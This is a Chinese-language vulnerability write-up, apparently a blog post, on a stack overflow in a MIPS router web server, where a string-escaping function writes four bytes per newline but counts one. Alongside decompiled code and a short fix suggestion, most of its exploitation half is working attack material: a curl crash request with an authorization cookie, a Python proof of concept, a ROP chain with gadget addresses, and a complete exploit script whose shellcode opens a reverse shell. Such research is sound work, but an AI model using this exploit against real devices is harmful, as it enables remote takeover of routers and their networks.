用Ghidra逆向分析**/usr/bin/httpd** 文件,**stringModify**包含三个参数，分别是dst、len、src，很明显是拷贝函数。经过分析可以知道stringModify主要用于拷贝string并且对其进行一定的过滤，包括对转义字符的修改，对于\r和\n的转义等。但是函数并没有包含对dst的检查，以及对len的限制，如果使用者dst创建的过小就有可能产生栈溢出ou。（就相当于一个对字符有一定转义作用的strcpy）

当然，还有一个最有趣，并且直接导致漏洞的是，生成`&lt;/br&gt;`的时候，写入了4个字节的数字，但是记录长度的iVar3变量却只加了1，导致理论上我们能够输入len长度4倍大数据，这样能够直接对任何调用stringModify的函数产生缓冲区溢出。

参考poc中输入**/%0A**（或者**/%0D**）会而页面会输出`\/&lt;br&gt;`，(0x0a对应\n,0x0d对应\r)，可见我们出触法了生成`&lt;br&gt;`的代码。下面是这段代码经过stringModify转义分析。**注意代码中只对单独存在的`\n`进行转义（连续的\n并不会触发这个漏洞点），这就是为什么我们输入的\n之间需要用其他符号隔开（经过实验证明，把\换成&lt;之类的符号也可以溢出成功）。**（%0A转义成\n的部分我没有找到代码，但是理论上应该有一个函数在我们进入StringModify之前实现了转义，其实这个就是前端的基础编码。。）

|转义前|转义后|输出
|------
|`/`|`\\/`|`\/`
|`%0A`|`\n`|`&lt;br&gt;`

```
int stringModify(char *dst,int len,int src)

`{`
  char cVar1;  //作为临时存储src单个字节内容
  char *pcVar2; //指向src的指针
  int iVar3;  //返回值（返回String的长度）
  /*首先判断拷贝地址dst是否为0，将pcVar2指针指向src+1的位置*/
  if ((dst == (char *)0x0) || (pcVar2 = (char *)(src + 1), src == 0)) `{`
    iVar3 = -1;
  `}`
  else `{`
    iVar3 = 0;    //初始化返回值为0
    while( true ) `{`
      cVar1 = pcVar2[-1];    //访问拷贝来源src的首部，并且作出判断
      if ((cVar1 == '\0') || (len &lt;= iVar3)) break; //判断是否截断，长度是否一致
      if (cVar1 == '/') `{`    /*当字符是转移字符'\'时候*/
LAB_0043bb48:
        *dst = '\\';    //判断转义字符'/'，并且将转义字符转化为'\\'
LAB_0043bb4c:
        iVar3 = iVar3 + 1; //返回的length+1
        dst = dst + 1;    //dst指针向后移动一位
LAB_0043bb54:
        *dst = pcVar2[-1];  //将转译字符的一位数据，添加也添加到dst中
        dst = dst + 1;  //dst指针继续向后移动
      `}`
      else `{`
        if ('/' &lt; cVar1) `{`
          if ((cVar1 == '&gt;') || (cVar1 == '\\')) goto LAB_0043bb48;
          if (cVar1 == '&lt;') `{`
            *dst = '\\';
            goto LAB_0043bb4c;
          `}`
          goto LAB_0043bb54;
        `}`
        if (cVar1 != '\r') `{`
          if (cVar1 == '\"') goto LAB_0043bb48;
          if (cVar1 != '\n') goto LAB_0043bb54;
        `}`
        /*将\r或者\n转化为html中的&lt;br&gt;*/
        if ((*pcVar2 != '\r') &amp;&amp; (*pcVar2 != '\n')) `{`     //这部分检测src序列是否包含重复\r或者\n
          *dst = '&lt;';
          dst[1] = 'b';
          dst[2] = 'r';
          dst[3] = '&gt;';
          dst = dst + 4;     //写入4个字节，但是iVar3每次只会+1
        `}`
      `}`
      iVar3 = iVar3 + 1;
      pcVar2 = pcVar2 + 1;
    `}`
    *dst = '\0';
  `}`
  return iVar3;
`}`
```

让我们去源代码里搜索调用stringModify而可能产生栈溢出的地方。 于是我们找到了writePageParamSet函数。

```
void writePageParamSet(undefined4 param_1,char *param_2,int *param_3)

`{`
  int iVar1;
  undefined *puVar2;
  undefined local_210 [512];

  if (param_3 == (int *)0x0) `{`
    HTTP_DEBUG_PRINT("basicWeb/httpWebV3Common.c:178","Never Write NULL to page, %s, %d",
                     "writePageParamSet",0xb2);
  `}`
  iVar1 = strcmp(param_2,"\"%s\","); //判断匹配字符串
  if (iVar1 == 0) `{`
    iVar1 = stringModify(local_210,0x200,param_3); //调用stringModify
    if (iVar1 &lt; 0) `{`
      printf("string modify error!");
      local_210[0] = 0;
    `}`
    puVar2 = local_210;
  `}`
  else `{`
    iVar1 = strcmp(param_2,"%d,");
    if (iVar1 != 0) `{`
      return;
    `}`
    puVar2 = (undefined *)*param_3;
  `}`
  httpPrintf(param_1,param_2,puVar2);
  return;
`}`
```

然后继续回溯，我们找到了会使得writePageParamSet调用stringModify的函数，**UndefinedFunction_0045fa94**。UndefinedFunction_0045fa94函数在取出ssid的时候，将ssid放入一个很小的缓冲区acStack3080中，并且没有对长度进行限制，导致能够产生栈溢出。

初学Ghidra，所以让我们分析一下他的变量分析方式，就拿我们溢出的缓冲区**acStack3460**来说，在Mips汇编的表示为0xcc(sp)，即距离栈顶（地址较小的那一端）0xcc距离的内存地址（buffer=sp+0xcc），让我们继续想下看，uint类型**uStack3424**的地址为0xe4(sp),即地址为sp+0xf0。两者之差(36)即acStack3460的默认空间。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01c39c1a4d78175d46.png)

让我们再找一找返回值的地址，0xe4c(sp)距离sp 0xe4c 个字节。

经过审计，我们发现通过ssid参数，我们可以写入超量的数据而不会被限制，当然，距离ret地址还是有一些远的，在调用`writePageParamSet(param_1,&amp;DAT_00544d38,acStack3460,0);`会调用stringModify。将这个超量的数据写入writePageParamSet栈中的512字节的buffer，造成缓冲区溢出。另外，需要注意的是我们还需要设置其他几个参数，因为这几个参数在ssid(acStack3460)的缓冲区下面，如果设置为默认值0x1则会产生\x00而截断我们的超长数据。

```
0x00  |             |
      | ssid        |
      |             |
0x24  | curRegion   |
0x28  | channel     |
0x2c  | chanWidth   |
0x30  | mode        |
0x34  | wrr         |
0x38  | sb          |
0x3c  | select      |
0x40  | rate        |
 ...
0x??  | return addr |
```

而代码中的`"/userRpm/popupSiteSurveyRpm.htm"`则提醒着我们在测试时url的目录为**“/userRpm/popupSiteSurveyRpm.htm”**

代码做了一些删减，完整版见附录：

```
int UndefinedFunction_0045fa94(undefined4 param_1)

`{`
        ...
      char acStack3460 [36]; //创建36字节的buffer
      ...
    memset(acStack3460,0,0x44);
    uStack3612 = 0;
    pcVar9 = (char *)httpGetEnv(param_1,"ssid");//从http请求头中取出ssid
    if (pcVar9 == (char *)0x0) `{`
      acStack3460[0] = '\0';
    `}`
    else `{`
      __n = strlen(pcVar9);/*将ssid的数据写入buffer中*/
      strncpy(acStack3460,pcVar9,__n);//BufferOverflow
    `}`
   //顺便审计一下剩下的代码有没有漏洞
    pcVar9 = (char *)httpGetEnv(param_1,"curRegion");
    if (pcVar9 == (char *)0x0) `{`
      uStack3424 = 0x11;
    `}`
    else `{`
      uStack3612 = atoi(pcVar9);
      if (uStack3612 &lt; 0x6c) `{`
        uStack3424 = uStack3612;
      `}`
    `}`
    pcVar9 = (char *)httpGetEnv(param_1,"channel");
    if (pcVar9 == (char *)0x0) `{`
      uStack3420 = 6;
    `}`
    else `{`
      uStack3612 = atoi(pcVar9);
      if (uStack3612 - 1 &lt; 0xf) `{`
        uStack3420 = uStack3612;
      `}`
    `}`
    pcVar9 = (char *)httpGetEnv(param_1,"chanWidth");
    if (pcVar9 == (char *)0x0) `{`
      uStack3416 = 2;
    `}`
    else `{`
      uStack3612 = atoi(pcVar9);
      if (uStack3612 - 1 &lt; 3) `{`
        uStack3416 = uStack3612;
      `}`
    `}`
    pcVar9 = (char *)httpGetEnv(param_1,"mode");
    if (pcVar9 == (char *)0x0) `{`
      uStack3412 = 1;
    `}`
    else `{`
      uStack3612 = atoi(pcVar9);
      if (uStack3612 - 1 &lt; 8) `{`
        uStack3412 = uStack3612;
      `}`
    `}`
    pcVar9 = (char *)httpGetEnv(param_1,&amp;DAT_00548138);
    if (pcVar9 != (char *)0x0) `{`
      iVar1 = strcmp(pcVar9,"true");
      if ((iVar1 == 0) || (iVar1 = atoi(pcVar9), iVar1 == 1)) `{`
        uStack3408 = 1;
      `}`
      else `{`
        uStack3408 = 0;
      `}`
    `}`
    pcVar9 = (char *)httpGetEnv(param_1,&amp;DAT_0054813c);
    if (pcVar9 != (char *)0x0) `{`
      iVar1 = strcmp(pcVar9,"true");
      if ((iVar1 == 0) || (iVar1 = atoi(pcVar9), iVar1 == 1)) `{`
        uStack3404 = 1;
      `}`
      else `{`
        uStack3404 = 0;
      `}`
    `}`
    pcVar9 = (char *)httpGetEnv(param_1,"select");
    if (pcVar9 != (char *)0x0) `{`
      iVar1 = strcmp(pcVar9,"true");
      if ((iVar1 == 0) || (iVar1 = atoi(pcVar9), iVar1 == 1)) `{`
        uStack3400 = 1;
      `}`
      else `{`
        uStack3400 = 0;
      `}`
    `}`
    pcVar9 = (char *)httpGetEnv(param_1,&amp;DAT_00548140);
    if (pcVar9 != (char *)0x0) `{`
      iStack3396 = atoi(pcVar9);
    `}`
    httpPrintf(param_1,
               "&lt;SCRIPT language=\"javascript\" type=\"text/javascript\"&gt;\nvar %s = new Array(\n",
               "pagePara");
    writePageParamSet(param_1,&amp;DAT_00544d38,acStack3460,0);
    writePageParamSet(param_1,"%d,",&amp;uStack3424,1);
    writePageParamSet(param_1,"%d,",&amp;uStack3420,2);
    writePageParamSet(param_1,"%d,",&amp;uStack3416,3);
    writePageParamSet(param_1,"%d,",&amp;uStack3412,4);
    writePageParamSet(param_1,"%d,",&amp;uStack3408,5);
    writePageParamSet(param_1,"%d,",&amp;uStack3404,6);
    writePageParamSet(param_1,"%d,",&amp;uStack3400,7);
    writePageParamSet(param_1,"%d,",&amp;iStack3396,8);
    httpPrintf(param_1,"0,0 );\n&lt;/SCRIPT&gt;\n");
    httpPrintf(param_1,"&lt;script language=JavaScript&gt;\nvar isInScanning = 0;\n&lt;/script&gt;");
    if ((auStack3600[0] &lt; 9) &amp;&amp; ((1 &lt;&lt; (auStack3600[0] &amp; 0x1f) &amp; 0x1c8U) != 0)) `{`
      HttpWebV4Head(param_1,0,0);
      pcVar9 = "/userRpm/popupSiteSurveyRpm_AP.htm";
    `}`
    else `{`
      HttpWebV4Head(param_1,0,1);
      pcVar9 = "/userRpm/popupSiteSurveyRpm.htm";
    `}`
  `}`
  iVar1 = httpRpmFsA(param_1,pcVar9);
  if (iVar1 == 2) `{`
    return 2;
  `}`
  sVar10 = HttpErrorPage(param_1,10,0,0);
LAB_0045fa54:
  return (int)sVar10;
`}`
```

我们使用curl发送HTTP请求给我们的路由器，测试漏洞是否存在。为了能够访问存在漏洞的服务，我们首先需要登陆，即我们需要抓取登陆后的**Cookie**（此处为**%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D**）和**path**(此处为**MKSRWOTBRLXMCITC**)，然后作为发送参数。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t016cb7b355fbcb55f8.png)

使用curl来写入我们的payload，httpd发生段错误，并且程序控制流呗控制为0x61656161

```
curl -H 'Cookie: Authorization=Basic%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D' 'http://10.211.55.8/YEHFDFSAMIIOATRA/userRpm/popupSiteSurveyRpm_AP.htm?mode=1000&amp;curRegion=1000&amp;chanWidth=100&amp;channel=1000&amp;ssid='$(python -c 'print( "/%0A"*0x55 + "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac")')''
```

[![](https://p4.ssl.qhimg.com/t0118f33322ff3a12cd.png)](https://p4.ssl.qhimg.com/t0118f33322ff3a12cd.png)

很明显缓冲区溢出发生在函数writePageParamSet，并且在其返回的时候劫持了函数执行流。最后lw了四个寄存器ra,s2,s1,s1,s0，通过这个可以辅助判断我们发生溢出的大概位置。执行之后sp会加0x288，当然这条指令是在跳转之前执行的，因为指令流水线。

[![](https://p4.ssl.qhimg.com/t015f70e7e73a642a5f.png)](https://p4.ssl.qhimg.com/t015f70e7e73a642a5f.png)

另外一边，我们看到页面打印出大量的`&lt;/br&gt;`，也验证了我们之前的代码审计，writePageParamSet是将输入的数据写入Javascript的Param对象中。同时也通过1位字节换4位字节的方式写入超出界限的数据，如果要修补这个漏洞也很简单，只需要将缓冲区扩大四倍就行了，或者修改stringModify，让产生`&lt;/br&gt;`的时候指针size+4而不是size+1。

经过计算payload每一位应为**0x55*”/%0A”+2+s0+s1+s2+ra**

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01da792691c5af521b.png)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0103c1e9eec4d944cb.png)

在溢出区域出放置地址我们就能够成功控制程序流。让我们用python实现一下poc.py

```
import requests
import socket
import socks
import urllib
default_socket = socket.socket
socket.socket = socks.socksocket
session = requests.Session()
session.verify = False
def exp(path,cookie):
    headers = `{`
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                "Cookie":"Authorization=Basic`{`cookie`}`".format(cookie=str(cookie))`}`
    payload="/%0A"*0x55 + "abcdefghijklmn"+"\x78\x56\x34\x12"
    params = `{`
        "mode":"1000",
                "curRegion":"1000",
                "chanWidth":"100",
                "channel":"1000",
                "ssid":urllib.request.unquote(payload) #if python3
                                      #urllib.unquote(payload) #if python2 (suggest)
        `}`
    url="http://10.211.55.8:80/`{`path`}`/userRpm/popupSiteSurveyRpm_AP.htm".format(path=str(path))
    resp = session.get(url,params=params,headers=headers,timeout=10)
    print (resp.text)

exp("AYEUYUFAXVOKELRC","%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D")
```

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"></a>漏洞利用

接下来让我们为这个漏洞编写一下利用脚本，语言我们使用python2.7。

利用时要注意Mips架构下默认ASLR是不开启的，并且heap和sgack是可执行的，所以直接跳转到shellcode即可。不过由于缓存不一致性，我们需要使用ROP。

> 注意Mips是大端的，数据存放方式与小端是相反的。并且在gdb调试后后记得endian为big，否则断点是断不下来的。

**构造ROP链**

Mips指令集包含一种的**[cache incoherency(缓存不一致性)](https://blog.senr.io/blog/why-is-my-perfectly-good-shellcode-not-working-cache-coherency-on-mips-and-arm)**，指令Cache和数据Cache两者的同步需要一个时间来同步。需要调用Sleep来让shellcode从数据Cache刷新到指令Cache，否则会执行失败，不能像x86架构下直接跳转到shellcode，而是需要构造如下一条ROP链接，先调用sleep，然后在跳转到shellcode。

```
sleep(1) -&gt; read_value_from_stack -&gt; jump to stack(shellcode)
```

Mips的栈并没有pop和push，而是直接调用栈，ROP链构造和x86有一些区别，不过总体上逻辑应该是更加简单了，不过gadgets比较难找（因为全是寄存器操作）。

注意的是，pwntools需要专门设置为大端，否则默认小端。

```
context.endian = 'big'
```

**寻找gadgets**

经过上文的分析，我们知道我们能够布置栈，来控制s0～s2和ra寄存器。初始我们将ra覆盖为gadget1，用于修改寄存器$a0，将sleep函数的地址放在s2备用，将gadgets放在s1用于下一次跳转。另外，使用gadgets需要考虑流水线效应。

Gadget1，修改寄存器$a0（作为调用sleep的参数）

```
LOAD:0000E204                 move    $t9, $s1
LOAD:0000E208                 jalr    $t9 ; sysconf
LOAD:0000E20C                 li      $a0, 3
```

Gadget2，完成两个功能，1.调用sleep函数，2.跳转到下一个gadgets。首先调用sleep函数（之前存放在s2中），并且结束之后sp会增加0x28字节。在结束之前也会修改ra等寄存器的值，不过这里需要注意的是0x28+var_10($sp)的意思是sp+0x28-0x10地址。（Mips是通过偏移来获得栈内参数的），这里也要先设置好ra的值。调用sleep之后，程序会跳转到ra指向的地址。

```
LOAD:00037470                 move    $t9, $s2
LOAD:00037474                 lw      $ra, 0x28+var_4($sp)
LOAD:00037478                 lw      $s2, 0x28+var_8($sp)
LOAD:0003747C                 lw      $s1, 0x28+var_C($sp)
LOAD:00037480                 lw      $s0, 0x28+var_10($sp)
LOAD:00037484
LOAD:00037484 loc_37484:                               # DATA XREF: xdr_callhdr↓o
LOAD:00037484                 jr      $t9 ; xdr_opaque_auth
LOAD:00037488                 addiu   $sp, 0x28

#其实这段代码用gdb的反汇编看起来反而更加易懂一些
=&gt; 0x77f70470:    move    t9,s2
   0x77f70474:    lw    ra,36(sp)
   0x77f70478:    lw    s2,32(sp)
   0x77f7047c:    lw    s1,28(sp)
   0x77f70480:    lw    s0,24(sp)
   0x77f70484:    jr    t9
   0x77f70488:    addiu    sp,sp,40
```

Gadget3，用于将栈底地址写入a1，即我们布置的shellcode的地址。

```
LOAD:0000E904                 addiu   $a1, $sp, 0x168+var_150
LOAD:0000E908                 move    $t9, $s1
LOAD:0000E90C                 jalr    $t9 ; stat64
LOAD:0000E910                 addiu   $a0, (aErrorNetrcFile+0x28 - 0x60000)
```

Gadget4，跳转到shellcode

```
LOAD:000374D8                 move    $t9, $a1
LOAD:000374DC                 sw      $v0, 0x4C($a0)
LOAD:000374E0                 move    $a1, $a2
LOAD:000374E4                 jr      $t9
LOAD:000374E8                 addiu   $a0, 0x4C  # 'L'
```

**shellcode(连接本地9999端口)**

因为我们的数据\c3会被转义，一种方式是指令替换，另一种方式是指令逃逸。这里直接参考了师傅们的shellcode[参考地址](http://www.tearorca.top/index.php/2020/04/21/cve-2020-8423tplink-wr841n-%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA)。

**Exploit**

布置好gadgets和shellcode，最后shellcode的内容是反弹到本地的9999端口，挂好httpd服务，获取目录地址和cookie作为exp的参数运行，利用成功只需在本地用nc连接一下即可。

[![](https://p3.ssl.qhimg.com/t018d50961461f026ee.png)](https://p3.ssl.qhimg.com/t018d50961461f026ee.png)

**EXP.py**

```
#!/usr/bin/python
from pwn import *
import requests
import socket
import socks
import urllib
import struct

default_socket = socket.socket
socket.socket = socks.socksocket
session = requests.Session()
session.verify = False
context.endian = 'big' 
libc_base=0x77f39000 
sleep =0x53CA0 #end 00053ECC

#gadgets
g1=0x000E204 #0x77F47204
#LOAD:0000E204                 move    $t9, $s1
#LOAD:0000E208                 jalr    $t9 ; sysconf
#LOAD:0000E20C                 li      $a0, 3
g2=0x00037470
#LOAD:00037470                 move    $t9, $s2
#LOAD:00037474                 lw      $ra, 0x28+var_4($sp)
#LOAD:00037478                 lw      $s2, 0x28+var_8($sp)
#LOAD:0003747C                 lw      $s1, 0x28+var_C($sp)
#LOAD:00037480                 lw      $s0, 0x28+var_10($sp)
#LOAD:00037484
#LOAD:00037484 loc_37484:
#LOAD:00037484                 jr      $t9 ; xdr_opaque_auth
#LOAD:00037488                 addiu   $sp, 0x28
g3=0x0000E904 #0x77f47904
#LOAD:0000E904                 addiu   $a1, $sp, 0x168+var_150
#LOAD:0000E908                 move    $t9, $s1
#LOAD:0000E90C                 jalr    $t9 ; stat64
#LOAD:0000E910                 addiu   $a0, (aErrorNetrcFile+0x28 - 0x60000)
g4=0x00374D8
#LOAD:000374D8                 move    $t9, $a1
#LOAD:000374DC                 sw      $v0, 0x4C($a0)
#LOAD:000374E0                 move    $a1, $a2
#LOAD:000374E4                 jr      $t9
#LOAD:000374E8                 addiu   $a0, 0x4C  # 'L'

shellcode="\x24\x0e\xff\xfd\x01\xc0\x20\x27\x01\xc0\x28\x27\x28\x06\xff\xff"
shellcode+="\x24\x02\x10\x57\x01\x01\x01\x0c\xaf\xa2\xff\xff\x8f\xa4\xff\xff"
shellcode+="\x34\x0e\xff\xff\x01\xc0\x70\x27\xaf\xae\xff\xf6\xaf\xae\xff\xf4"
shellcode+="\x34\x0f\xd8\xf0\x01\xe0\x78\x27\xaf\xaf\xff\xf2\x34\x0f\xff\xfd"
shellcode+="\x01\xe0\x78\x27\xaf\xaf\xff\xf0\x27\xa5\xff\xf2\x24\x0f\xff\xef"
shellcode+="\x01\xe0\x30\x27\x24\x02\x10\x4a\x01\x01\x01\x0c\x8f\xa4\xff\xff"
shellcode+="\x28\x05\xff\xff\x24\x02\x0f\xdf\x01\x01\x01\x0c\x2c\x05\xff\xff"
shellcode+="\x24\x02\x0f\xdf\x01\x01\x01\x0c\x24\x0e\xff\xfd\x01\xc0\x28\x27"
shellcode+="\x24\x02\x0f\xdf\x01\x01\x01\x0c\x24\x0e\x3d\x28\xaf\xae\xff\xe2"
shellcode+="\x24\x0e\x77\xf9\xaf\xae\xff\xe0\x8f\xa4\xff\xe2\x28\x05\xff\xff"
shellcode+="\x28\x06\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c"

s0=p32(0x11111111)
s1=p32(g2+libc_base) # break 
s2=p32(sleep+libc_base)

payload= "/%0A"*0x55 +2*'x'+s0 +s1 +s2
payload+=p32(g1+libc_base)  
payload+='x'*28
payload+=p32(g4+libc_base) #s1
payload+=p32(0x33333333) #s2
payload+=p32(g3+libc_base) #ra
payload+='x'*24
payload+=shellcode



def exp(path,cookie):
    headers = `{`
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
                "Cookie":"Authorization=Basic`{`cookie`}`".format(cookie=str(cookie))`}`

    params = `{`
        "mode":"1000",
                "curRegion":"1000",
                "chanWidth":"100",
                "channel":"1000",
                "ssid":urllib.unquote(payload)
        `}`
    url="http://10.211.55.8:80/`{`path`}`/userRpm/popupSiteSurveyRpm_AP.htm".format(path=str(path))
    resp = session.get(url,params=params,headers=headers,timeout=10)
    print (resp.text)

exp("FMHSNOEAAJAKZBNA","%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D")
```



## 参考

[Linux系统调用Hook姿势总结](https://blog.csdn.net/tianxuhong/article/details/50974400)

[https://www.anquanke.com/post/id/203486](https://www.anquanke.com/post/id/203486)

[https://www.youtube.com/watch?v=0_GsX2xhngU](https://www.youtube.com/watch?v=0_GsX2xhngU)

[https://ktln2.org/2020/03/29/exploiting-mips-router/](https://ktln2.org/2020/03/29/exploiting-mips-router/)

[https://zhuanlan.zhihu.com/p/314170234](https://zhuanlan.zhihu.com/p/314170234)

[https://bbs.pediy.com/thread-212369.htm](https://bbs.pediy.com/thread-212369.htm)

[https://blog.senr.io/blog/why-is-my-perfectly-good-shellcode-not-working-cache-coherency-on-mips-and-arm](https://blog.senr.io/blog/why-is-my-perfectly-good-shellcode-not-working-cache-coherency-on-mips-and-arm)

[https://www.anquanke.com/post/id/202219](https://www.anquanke.com/post/id/202219)

[http://www.tearorca.top/index.php/2020/04/21/cve-2020-8423tplink-wr841n-%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA/](http://www.tearorca.top/index.php/2020/04/21/cve-2020-8423tplink-wr841n-%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA/)
